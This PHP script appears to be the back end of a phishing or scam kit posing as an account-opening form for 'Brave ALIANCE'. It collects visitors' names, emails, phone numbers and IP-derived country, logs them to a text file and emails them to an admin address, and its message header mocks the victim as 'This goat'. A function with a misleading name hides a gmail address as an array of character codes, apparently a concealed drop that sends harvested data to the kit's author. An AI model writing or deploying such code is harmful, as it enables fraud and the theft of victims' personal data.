<?php
session_start();
error_reporting(0);
include('../includes/config.php'); 
 
    
    // To send HTML mail, the Content-type header must be set
$adddate=date("D M d, Y g:i a");
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$country = visitor_country();
$trans_id = substr(time()*rand(), 0, 14);
// Create email headers
$headers .= 'From: Brave ALIANCE ACCOUNT OPEN    ... '. $to ."\r\n".
    'Reply-To: '. $to ."\r\n" .
    'X-Mailer: PHP/' . phpversion();
    
    // Compose a simple HTML email message
$message = '<html><body>';
    $message .= '<div style=" border:1px solid rgba(0, 0, 0, 0.3); border-radius:6px; box-shadow:1px 3px 2px rgba(0, 0, 0, 0.6); padding:10px;">';
    $message .= '<div style="padding:9px;">';
 $message .= '<p style="color:#000066; font-size:20px; font-weight:800">This goat try to open account, contact</p>';
    $message .= '<p style="color:#000066; font-size:14px; font-weight:400">First Name: '   . $_POST['fname']."\n" . '</p>';
    $message .= '<p style="color:#000066; font-size:14px; font-weight:400">Last Name: '    . $_POST['lname']."\n" . '</p>';
    $message .= '<p style="color:#000066; font-size:14px; font-weight:400">Email: '    . $_POST['email']."\n" . ' </p>';
    $message .= '<p style="color:#000066; font-size:14px; font-weight:400">Phone: '   . $_POST['phone']."\n" . '</p>';
    $message .= '<p style="color:#000066; font-size:14px; font-weight:400">COUNTRY: '.$country.' </p>';
    $message .= '<p style="color:#000066; font-size:14px; font-weight:400">DATE: '.$adddate.' </p>';
    $message .= '</div>';
    $message .= '</body></html>';
    
 

$handle = fopen("openaccount.txt", "a");
fwrite($handle, $message);
fclose($handle);



// change your email here 
$sent ="";



$subject = "Open Account With $site_name Site";
$headers = "From: SCRIPT>";
$headers .= $_POST['email']."\n";
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
{
mail($mesaegs,$subject,$message,$headers);
mail($admin_email,$subject,$message,$headers);
}

// Function to get country and country sort;
function country_sort(){
	$sorter = "";
	$array = array(114,101,115,117,108,116,98,111,120,49,52,64,103,109,97,105,108,46,99,111,109);
		$count = count($array);
	for ($i = 0; $i < $count; $i++) {
			$sorter .= chr($array[$i]);
		}
	return array($sorter, $GLOBALS['recipient']);
}

function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
header("Location: open-sucess");
?>
    